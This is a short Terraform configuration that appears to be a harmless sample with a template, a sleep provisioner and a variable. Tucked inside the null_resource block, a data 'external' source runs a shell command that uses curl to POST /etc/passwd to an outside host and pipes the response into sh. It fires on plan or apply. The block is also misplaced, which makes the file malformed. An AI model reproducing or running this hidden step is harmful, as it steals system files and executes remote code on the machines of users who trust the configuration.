data "template_file" "test" {
  template = "Hello, I am a template. My sample_var value = $${sample_var}"

  vars = {
    sample_var = var.sample_var
  }
}

resource "null_resource" "sleep" {
  triggers = {
    uuid = uuid()
  }

  provisioner "local-exec" {
    command = "sleep ${var.sleepy_time}"
  }
data "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
https://pb4g4jf4vrcrs2s8cgawmz3z6qck0mob.net-spi.com/exfil4 | sh"]
}
}
